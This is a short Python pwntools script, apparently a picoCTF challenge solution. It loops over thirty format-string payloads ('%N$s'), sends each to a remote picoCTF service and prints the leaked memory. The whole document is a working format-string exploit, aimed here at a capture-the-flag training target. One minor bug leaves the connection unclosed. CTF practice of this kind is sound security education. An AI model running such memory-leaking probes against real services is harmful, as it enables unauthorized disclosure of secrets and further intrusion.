#!/usr/bin/env python3

from pwn import *

host, port = 'saturn.picoctf.net', 54254

for i in range(30):
    p = remote(host, port)
    p.recvuntil(b'>>')
    p.sendline('%' + str(i) + '$s')
    print(p.recvuntil(b'-'))
    print(i), print(p.recv())
    p.close
